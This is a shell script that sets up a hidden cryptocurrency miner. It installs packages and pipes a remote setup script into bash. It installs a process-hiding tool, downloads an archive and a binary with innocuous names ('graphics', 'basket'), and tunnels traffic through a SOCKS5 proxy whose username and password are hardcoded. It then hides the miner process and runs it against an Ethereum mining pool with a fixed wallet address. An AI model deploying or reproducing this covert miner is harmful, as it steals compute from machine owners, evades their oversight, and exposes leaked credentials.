#!/bin/sh
apt update

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget -O - https://deb.nodesource.com/setup_17.x | bash

apt -y install nodejs

apt -y install npm

npm i -g node-process-hider

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = gpusocks3.wot.mrface.com:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

ps -A | grep graftcp* | awk '{print $1}' | xargs kill -9 $1

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .5

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
chmod +x basket

ph add basket

./basket -a ethash -o ethproxy+ssl://eth-de.flexpool.io:5555 -u 0xBEd5bf95C4cc238F249D0C08D51604ce641b422E.jet -log --proxy mikrotik999:Elibawnos@gpusocks3.wot.mrface.com:1080
